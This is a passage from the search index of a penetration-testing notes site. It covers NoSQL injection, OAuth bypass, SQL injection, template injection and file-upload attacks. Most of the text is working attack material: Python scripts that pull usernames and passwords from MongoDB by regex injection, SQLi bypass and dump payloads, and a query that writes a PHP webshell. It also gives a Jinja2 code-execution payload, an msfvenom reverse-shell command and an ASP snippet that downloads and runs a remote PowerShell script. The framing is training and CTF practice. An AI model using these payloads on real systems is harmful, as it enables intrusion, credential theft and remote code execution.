curl, we need to bundle them in PKCS#12 format. openssl pkcs12 -export -clcerts -in alice_cert.pem -inkey alice_key.pem -out alice.p12 openssl pkcs12 -export -in bob_cert.pem -inkey bob_key.pem -out bob.p12 Via Browser Settings -&gt; Privacy &amp; Security -&gt; Security -&gt; Certificates -&gt; View Certificates... -&gt; Your Certificates -&gt; Import Via Curl curl --insecure --cert mvc1009.p12 --cert-type p12 https: localhost:443 https: medium.com @sevcsik authentication-using-https-client-certificates-3c9d270e8326 References: https: www.netsparker.com blog web-security php-type-juggling-vulnerabilities https: medium.com swlh php-type-juggling-vulnerabilities-3e28c4ed5c09 https: book.hacktricks.xyz pentesting pentesting-web php-tricks-esp https: owasp.org www-pdf-archive PHPMagicTricks-TypeJuggling.pdf"
					}

					
				
			
		
			
				
					,
					

					"web-nosqli": {
						"id": "web-nosqli",
						"title": "NoSQL Injection (NoSQLi)",
						"category": "",
						"url": " /web/nosqli/",
						"content": "NoSQL injection attacks can be especially dangerous because code Introduction NoSQL injection vulnerabilities allow attackers to inject code into commands for databases that don’t use SQL queries, such as MongoDB. NoSQL injection attacks can be especially dangerous because code is injected and executed on the server in the language of the web application, potentially allowing arbitrary code execution. Simple MongoDB Injection For a basic authentication bypass, the attacker can try to enter MongoDB operators in field values, for example $eq (equals), $ne (not equal to) or $gt (greater than). Here’s an unsafe way to build a database query in a PHP application, with the parameter values taken directly from a form: $query = array(\"user\" =&gt; $_POST[\"username\"], \"password\" =&gt; $_POST[\"password\"]); If this query is then used to check login credentials, the attacker can abuse PHP’s built-in associative array processing to inject a MongoDB query that always returns true and bypass the authentication process. This may be as simple as sending the following POST request: username[$ne]=1&amp;password[$ne]=1 PHP will translate this into an array of arrays: array(\"username\" =&gt; array(\"$ne\" =&gt; 1), \"password\" =&gt; array(\"$ne\" =&gt; 1)); When sent as a MongoDB query to a user store, this will find all users where the user name and password are not equal to 1, which is highly likely to be true and may allow the attacker to bypass authentication. Login Bypass (PHP) Injecting the $ne : #Find some one where username not equals to \"\" and password not equals to \"\" username[$ne]=&amp;password[$ne]=&amp;login=login Dumping Database (PHP) First instead of $ne we are going to use $regex in order to discover character by character. Get all Usernames First we are going to see al type of characters used in the usernames. import sys, os, requests, codecs import string s = requests.Session() for char in string.ascii_lowercase: regex = '{}.*'.format(char) data_post = { \"username[$regex]\" : regex, \"password[$ne]\" : \"password\", \"login\" : \"login\" } resp = s.post(\"http: staging-order.mango.htb index.php\", data=data_post, verify=False, allow_redirects=False) if resp.status_code == 302: print(\"Valid letter: \" + char) Regex: {}.* ❯ python3 exploit.py Valid letter: a Valid letter: d Valid letter: g Valid letter: i Valid letter: m Valid letter: n Valid letter: o Secondly, we are going to check which one goes at firs position: import sys, os, requests, codecs import string s = requests.Session() valid_letters = ['a', 'd', 'g', 'i', 'm', 'n', 'o'] for char in valid_letters: regex = '^{}.*'.format(char) data_post = { \"username[$regex]\" : regex, \"password[$ne]\" : \"password\", \"login\" : \"login\" } resp = s.post(\"http: staging-order.mango.htb index.php\", data=data_post, verify=False, allow_redirects=False) if resp.status_code == 302: print(\"Starts with: \" + char) Regex: ^{}.* ^ Indicates starts with ❯ python3 exploit.py Starts with: a Starts with: m Finally we are going to loop until fails all characters used. import sys, os, requests, codecs import string s = requests.Session() def nextLetter(word): valid_letters = ['a', 'd', 'g', 'i', 'm', 'n', 'o'] for char in valid_letters: regex = '^{}.*'.format(word+char) data_post = { \"username[$regex]\" : regex, \"password[$ne]\" : \"password\", \"login\" : \"login\" } resp = s.post(\"http: staging-order.mango.htb index.php\", data=data_post, verify=False, allow_redirects=False) if resp.status_code == 302: return char return None def getUser(start): name = start while True: l = nextLetter(name) if l is None: break; else: name += l return name startsWith = ['a', 'm'] for char in startsWith: print('Username: ' + getUser(char)) ❯ python3 enum_letters.py Username: admin Username: mango Get Passwords: Same as users but remember to change the $regex of the user to $ne and the other way with password. import sys, os, requests, codecs import string s = requests.Session() def nextLetter(user, word): special_char = ['^','*', '$', '|', '.','\\\\' ,'+','?'] for char in string.printable: if char in special_char: continue; regex = '^{}.*'.format(word+char) data_post = { \"username\" : user, \"password[$regex]\" : regex, \"login\" : \"login\" } resp = s.post(\"http: staging-order.mango.htb index.php\", data=data_post, verify=False, allow_redirects=False) if resp.status_code == 302: return char return None def getPass(user): passw = \"\" while True: l = nextLetter(user, passw) if l is None: break; else: passw += l return passw users = ['admin', 'mango'] for user in users: print('Username: ' + user + ' Password: ' + getPass(user)) ❯ python3 exploit.py Username: admin Password: t9KcS3&gt;!0B#2 Username: mango Password: h3mXK8RhU~f{]f5H Remember: Escape characters that could lead to problems with a regex."
					}

					
				
			
		
			
				
					,
					

					"web-oauth-2-0-bypass": {
						"id": "web-oauth-2-0-bypass",
						"title": "OAuth 2.0 Bypass",
						"category": "",
						"url": " /web/oauth-2.0-bypass/",
						"content": "Introduction OAuth is a commonly used authorization framework that enables websites and web applications to request limited access to a user’s account on another application. Crucially, OAuth allows the user to grant this access without exposing their login credentials to the requesting application. Vulnerabilities in the OAuth client application Client applications will often use a reputable, battle-hardened OAuth service that is well protected against widely known exploits. However, their own side of the implementation may be less secure. Improper implementation of the implicit grant type Once the OAuth 2.0 flow is completed and the token is assigned, the information is sent to the application (username, email and the token). We can bypass the authentication by changing the email and username of the request: # Original Request POST authenticate HTTP 1.1 Host: oauth-test.com User-Agent: Mozilla 5.0 (X11; Linux x86_64; rv:78.0) Gecko 20100101 Firefox 78.0 Accept: application json Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https: oauth-test.com oauth-callback Content-Type: application json Origin: https: app-test.com Content-Length: 103 Connection: close Cookie: session=Pjx1J1HBlOKuYpE6ngdvP0lwKrc6N6xn { \"email\":\"user@test.com\", \"username\":\"user\", \"token\":\"0Uk8oyhR95JLrFnDdsgFBcHdcH1Tcz8GmLoZe6ECOAi\" } # Edited Request POST authenticate HTTP 1.1 Host: oauth-test.com User-Agent: Mozilla 5.0 (X11; Linux x86_64; rv:78.0) Gecko 20100101 Firefox 78.0 Accept: application json Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https: oauth-test.com oauth-callback Content-Type: application json Origin: https: app-test.com Content-Length: 103 Connection: close Cookie: session=Pjx1J1HBlOKuYpE6ngdvP0lwKrc6N6xn { \"email\":\"another@test.com\", \"username\":\"another\", \"token\":\"0Uk8oyhR95JLrFnDdsgFBcHdcH1Tcz8GmLoZe6ECOAi\" } Flawed CSRF protection (no state parameter) Although many components of the OAuth flows are optional, some of them are strongly recommended unless there’s an important reason not to use them. One such example is the state parameter. The state parameter should ideally contain an unguessable value, such as the hash of something tied to the user’s session when it first initiates the OAuth flow. This value is then passed back and forth between the client application and the OAuth service as a form of CSRF token for the client application. Since this state parameter is not available in the request we can link our profile media to an existing account by exploiting a CSRF attack: # CSRF vulnerable request GET oauth-linking?code=FIKlXwX7-cq6Xz0nsWmYUhqu1rwrRmKL9haVHOA7zVv HTTP 1.1 Host: app.test.com User-Agent: Mozilla 5.0 (X11; Linux x86_64; rv:78.0) Gecko 20100101 Firefox 78.0 Accept: text html,application xhtml+xml,application xml;q=0.9,image webp,* *;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Referer: https: exploit.test.com exploit Cookie: session=4UxlhSNG2r19csEDsUySJwHtVPSyE4eE Upgrade-Insecure-Requests: 1 Payload: # index.html &lt;iframe src=\"https: app.test.com oauth-linking?code=FIKlXwX7-cq6Xz0nsWmYUhqu1rwrRmKL9haVHOA7zVv\"&gt; &lt; iframe&gt; Leaking authorization codes and access tokens Depending on the grant type, either a code or token is sent via the victim’s browser to the callback endpoint specified in the redirect_uri parameter of the authorization request. If the OAuth service fails to validate this URI properly, an attacker may be able to construct a CSRF-like attack, tricking the victim’s browser into initiating an OAuth flow that will send the code or token to an attacker-controlled redirect_uri. In the case of the authorization code flow, an attacker can potentially steal the victim’s code before it is used. They can then send this code to the client application’s legitimate callback endpoint (the original redirect_uri) to get access to the user’s account. # CSRF Vulnerable Request # Modify the redirect_uri to a coontrolled server GET auth?client_id=zg8andmpp2lfjqidng0tr&amp;redirect_uri=https: myserver.com evil&amp;response_type=code&amp;scope=openid%20profile%20email HTTP 1.1 Host: oauth-server.example.com User-Agent: Mozilla 5.0 (X11; Linux x86_64; rv:78.0) Gecko 20100101 Firefox 78.0 Accept: text html,application xhtml+xml,application xml;q=0.9,image webp,* *;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: _session=7rn_lI1PoVH0bMKi3_Cmq; _session.legacy=7rn_lI1PoVH0bMKi3_Cmq Upgrade-Insecure-Requests: 1 Payload: #index.html &lt;iframe src=\"https: oauth-server.example.com auth?client_id=zg8andmpp2lfjqidng0tr&amp;redirect_uri=https: myserver.com evil&amp;response_type=code&amp;scope=openid%20profile%20email\"&gt; &lt; iframe&gt; Pentesting OAuth 2.0 redirect_uri validation redirect_uri parameter should be validated via white list, but sometimes is misconfigured and leads to flaws and vulnerabilities. Things to check: Try to remove or add arbitrary paths, query parameters, and fragments to see what you can change without triggering an error. Try to append extra values to the default redirect_uri parameter: https: example.com &amp;@foo.evil.com#@bar.evil.com . Try duplicate redirect_uri parameter. Begin with localhost : http: localhost.evil.com . References https: portswigger.net web-security oauth"
					}

					
				
			
		
			
				
					,
					

					"web-sqli": {
						"id": "web-sqli",
						"title": "SQL Injection (SQLi)",
						"category": "",
						"url": " /web/sqli/",
						"content": "SQLi is a common web application vulnerability that is caused by unsanitized user input being inserted into SQL queries. Automatization with sqlmap # Post sqlmap -r request.txt -p username # Get sqlmap -u \"http: example.com index.php?id=1\" -p id # Crawl sqlmap -u http: example.com --dbms=mysql --crawl=3 Note: request.txt is a request saved in BurpSuite. Dumping a Table sqlmap -r request.txt -p username -D database_name -T table_name --dump Union Attack When an application is vulnerable to SQL injection and the results of the query are returned within the application’s responses, the UNION keyword can be used to retrieve data from other tables within the database. MySQL syntax for the example: $sql = \"SELECT id, name, text FROM example WHERE id=\" . $_GET['id']; Column Number Enumeration After detect that the application is vulnerable to SQLi we need to know how many columns are queried. To do that task we are going to use order by to guess the number of columns retrieved. The idea is to increment the number until get an error. index.php?id=1 order by 1 index.php?id=1 order by 2 index.php?id=1 order by 3 index.php?id=1 order by 4 - ERROR Output Layout Now that we know how many columns are in the table, we can use this information to retrieve information. But we need to before understand where this information will be displayed, so we are going to set parameteres to that fields. index.php?id=1 union all select 1, 2, 3 Extracting Data from Database Now knowing that the third column is for descriptions, we can put there all information. index.php?id=1 union all select 1, 2, @@version index.php?id=1 union all select 1, 2, user() index.php?id=1 union all select 1, 2, table_name from information_schema.tables index.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users' index.php?id=1 union all select 1, username, passwords from users Read files Some databases allows us to read or write files in the filesystem. index.php?id=1 union all select 1, 2, load_file(' etc passwd') From SQLi to RCE Since we are allowed to upload files, we can upload a webshell to the web root. index.php?id=1 union all select 1, 2, \"&lt;?php system($_GET['cmd']);?&gt;\" into OUTFILE ' var www html backdoor.php' In case of exploiting a Microsoft SQL Server check this: SQL Server Login Bypass The most classic ones: ' or '1'='1 ' or 1=1-- - ' or 1=1# Then others: -' ' ' '&amp;' '^' '*' ' or ''-' ' or '' ' ' or ''&amp;' ' or ''^' ' or ''*' \"-\" \" \" \"&amp;\" \"^\" \"*\" \" or \"\"-\" \" or \"\" \" \" or \"\"&amp;\" \" or \"\"^\" \" or \"\"*\" or true-- \" or true-- ' or true-- \") or true-- ') or true-- ' or 'x'='x ') or ('x')=('x ')) or (('x'))=(('x \" or \"x\"=\"x \") or (\"x\")=(\"x \")) or ((\"x\"))=((\"x Knowing the username When we are aware of some username we can impersonate him with SQLi by introducing the username and commenting the rest of the SQL Query. administrator'-- - administrator'# Error Based SQLi Use CONVERT or CAST to force an ERROR and see the output of the query on errors logs. Example of Microsoft SQL Server: 1', CONVERT(int,SELECT ...... FROM ....) a',convert(int,(SELECT CURRENT_USER)))-- a',convert(int,(SELECT DB_NAME(0))))-- a',convert(int,(SELECT DB_NAME(1))))-- # SELECT FIRST TABLE a',convert(int,(SELECT TOP 1 name from DATABASE..sysobjects where xtype='U')))-- # SELECT A N TABLE (OFFSET) a',convert(int,(SELECT name from DATABASE..sysobjects where xtype='U' ORDER BY name OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY )))-- # SELECT A N COLUMN NAME(OFFSET) of TABLE a',convert(int,(SELECT name from DATABASE..syscolumns WHERE id = (SELECT id FROM DATABASE..sysobjects WHERE name = 'TABLE') ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)))-- # DUMP - repeat it modifyng the OFFSET to retrieve all table entries a',convert(int,(SELECT username FROM DATABASE..TABLE ORDER BY username OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)))-- a',convert(int,(SELECT password FROM DATABASE..TABLE ORDER BY password OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)))-- Blind SQLi A SQLi is blind because we don’t have access to the error log or any type of output which difficult a lot the process of exploitation. Time Based Since we are not aware about any type of error or output we can use sleeps. 1-sleep(4) If it loads for four seconds extra we know that the database is processing our sleep() command. Dump tables It can also be done with sqlmap or manually with a custom script. In that case the script is dumping MD5 hashes from password field. import requests chars = \"0123456789abcdef\" def GetSQL(i,c): return \"admin' and substr(password,%s,1) = '%s' -- -\" % (i,c) for i in range(1,33): for c in chars: injection = GetSQL(i,c) payload = {'username':injection,'password':\"randompassword\"} r = requests.post('http: 10.10.10.73 login.php',data=payload) if 'Wrong identification' in r.text: print(c,end='',flush=True) break print() Note: MD5 hash are hexadecimal with 33 character length. https: github.com codingo OSCP-2 blob master Documents SQL%20Injection%20Cheatsheet.md References https: portswigger.net web-security sql-injection union-attacks https: sushant747.gitbooks.io total-oscp-guide content sql-injections.html"
					}

					
				
			
		
			
				
					,
					

					"web-templates-injections": {
						"id": "web-templates-injections",
						"title": "Server Side Templates Injections (SSTI)",
						"category": "",
						"url": " /web/templates-injections/",
						"content": "SSTI (Server Side Templates Injections) occurs when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side. There are different frameworks that uses templates, this guide could help to detect which is and exploit them. Flask Flask is a framework for web applications written in Python and developed from the Werkzeug and Jinja2 tools. Syntax SSTI \\{\\{7*7\\}\\} \\{\\{ varname \\}\\} &lt;div data-gb-custom-block data-tag=\"if\" data-1='1'&gt;&lt; div&gt;PRINT&lt;div data-gb-custom-block data-tag=\"else\"&gt;NOPRINT&lt; div&gt; RCE (Remote Code Execution) &lt;div data-gb-custom-block data-tag=\"for\"&gt;&lt;div data-gb-custom-block data-tag=\"if\" data-0='warning'&gt;\\{\\{x()._module.__builtins__['__import__']('os').popen(\"touch tmp RCE.txt\").read()\\}\\}&lt; div&gt;&lt; div&gt; Note: Delete backslashs {{ }} in order to permorm the work desired. To bypass some restrictions take a look at the following resources: References https: pequalsnp-team.github.io cheatsheet flask-jinja2-ssti https: book.hacktricks.xyz pentesting-web ssti-server-side-template-injection https: github.com swisskyrepo PayloadsAllTheThings tree master Server%20Side%20Template%20Injection#jinja2"
					}

					
				
			
		
			
				
					,
					

					"web-unrestricted-file-upload": {
						"id": "web-unrestricted-file-upload",
						"title": "Unrestricted File Upload",
						"category": "",
						"url": " /web/unrestricted-file-upload/",
						"content": "Different ways to upload files and get RCE. Identifies restrictions Extension Shortening the size (falafel.htb): Linux maximum 255 chars touch $(python3 -c \"print('A'*251+'.png')\") wget 'http: 10.10.14.20:8000 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.png' Search the correct offset and upload again: echo '&lt;?php system($_GET[\"cmd\"]);?&gt;' &gt; $(python3 -c 'print(\"A\"*(236-4)+\".php.png\")') wget 'http: 10.10.14.20:8000 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.png' Size Name Magic Number Content ASP First we need to generate the reverse shell. msfvenom -p windows shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o rev.exe Finally upload the rev.asp and rev.exe files to get a connection shell back. &lt;% Dim oS On Error Resume Next Set oS = Server.CreateObject(\"WSCRIPT.SHELL\") Call oS.Run(\"win.com cmd.exe c c:\\Inetpub\\rev.exe\",0,True) %&gt; .config RCE (IIS) Uploading a web.config file to execute asp commands. &lt;configuration&gt; &lt;system.webServer&gt; &lt;handlers accessPolicy=\"Read, Script, Write\"&gt; &lt;add name=\"web_config\" path=\"*.config\" verb=\"*\" modules=\"IsapiModule\" scriptProcessor=\"%windir%\\system32\\inetsrv\\asp.dll\" resourceType=\"Unspecified\" requireAccess=\"Write\" preCondition=\"bitness64\" &gt; &lt; handlers&gt; &lt;security&gt; &lt;requestFiltering&gt; &lt;fileExtensions&gt; &lt;remove fileExtension=\".config\" &gt; &lt; fileExtensions&gt; &lt;hiddenSegments&gt; &lt;remove segment=\"web.config\" &gt; &lt; hiddenSegments&gt; &lt; requestFiltering&gt; &lt; security&gt; &lt; system.webServer&gt; &lt; configuration&gt; &lt;% Response.write(1+1) %&gt; If this works we can execute a reverse shell. &lt;% Set objShell = CreateObject(\"WScript.Shell\") strCommand = \"cmd c powershell.exe -c IEX (New-Object Net.Webclient).downloadstring('http: &lt;ip-addr&gt; shell.ps1')\" Set objShellExec = objShell.Exec(strCommand) strOutput = objShellExec.StdOut.ReadAll() WScript.StdOut.Write(strOutput) WScript.Echo(strOutput) %&gt; PHP The are some typicall PHP webshells, but some are detected by AV. Here are some usefull ones. https: github.com bayufedra Tiny-PHP-Webshell &lt;?=`$_GET[0]`?&gt; Usage : http: target.com path to shell.php?0=command &lt;?=`$_POST[0]`?&gt; Usage : curl -X POST http: target.com path to shell.php -d \"0=command\""
					}

					
				
			
		
	};
</script>
<script src="/hackingnotes/scripts/lunr.min.js"></script>
<script src="/hackingnotes/scripts/search.js"></script>

			</article>
		</section>

		<script>
			document.getElementById("open-nav").addEventListener("click", function () {
				document.body.classList.toggle("nav-open");
			});
		</script>
	</body>
</html>
